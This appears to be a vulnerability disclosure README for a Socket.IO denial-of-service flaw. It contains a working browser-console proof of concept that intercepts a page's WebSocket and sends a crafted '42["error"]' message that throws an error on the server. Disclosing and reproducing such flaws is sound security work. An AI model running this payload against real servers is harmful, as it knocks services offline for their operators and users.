# Socket.IO CVE
A carefully crafted message sent from a connected client can throw an error on the server, causing denial of service

## Replication
- In the code below, the attack will commence as soon as soon as the [WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket) instance is intercepted
- One can run this repository, open the url it would be hosted in a browser and paste the code in to execute the attack
- You can wait for a probe from the server or initiate some interaction just to access the websocket to send the maliciously crafted text
- This works to at least `3.1.2` and it works because of unfortunately handled events from [socket.io](https://github.com/socketio/socket.io)
```js
function listen(fn){ //this function from my answer in https://stackoverflow.com/a/70267397/10697213
  fn = fn || console.log;

  let property = Object.getOwnPropertyDescriptor(MessageEvent.prototype, "data");
  
  const data = property.get;

  // wrapper that replaces getter
  function lookAtMessage() {

    let socket = this.currentTarget instanceof WebSocket;

    if (!socket) {
      return data.call(this);
    }

    let msg = data.call(this);

    Object.defineProperty(this, "data", { value: msg } ); //anti-loop
    fn({ data: msg, socket:this.currentTarget, event:this });
    return msg;
  }
  
  property.get = lookAtMessage;
  
  Object.defineProperty(MessageEvent.prototype, "data", property);
}

listen( ({data,socket}) => {
  console.log(data)
  window.server=socket
  //2 lines above contain pointless logging
  server.send('42["error"]') //THIS IS THE CRITICAL LINE
})
```